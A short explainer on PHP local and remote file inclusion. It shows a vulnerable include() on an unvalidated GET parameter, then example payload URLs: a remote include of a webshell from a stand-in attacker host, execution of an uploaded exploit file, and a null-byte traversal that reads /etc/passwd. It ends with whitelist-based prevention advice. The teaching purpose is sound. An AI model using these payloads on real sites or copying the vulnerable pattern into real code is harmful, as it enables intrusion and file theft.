# Local file inclusion

In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution. Most notable are the `include` and `require` statements.

```php
<?php
<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

```html
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="melay">French</option>
      ...
   </select>
   <input type="submit">
</form>
```

The developer intended to read in `english.php` or `french.php`, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the `language` parameter.

- `/vulnerable.php?language=**http://evil.example.com/webshell.txt?**` - injects a remotely hosted file containing a malicious code (remote file include)
- `/vulnerable.php?language=**C:\\ftp\\upload\\exploit**` - Executes code from an already uploaded file called `exploit.php` (local file inclusion vulnerability)
- `/vulnerable.php?language=**../../../../../etc/passwd%00**` - allows an attacker to read the contents of the `/etc/passwd` file on a Unix system through a [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack").

> Remote file inclusion - Attacker supply remote url as `/vulnerable.php?language=**http://evil.example.com/webshell.txt?**`

## Prevention

The best solution in the above case is to use a whitelist of accepted language parameters.

- It is better to maintain a whitelist of acceptable filenames and use a corresponding identifier (not the actual name) to access the file. Any request containing an invalid identifier can then simply be rejected.
- Save the file paths in a database and assign an ID to each of them. By doing so, users only see the ID and are not able to view or change the path.
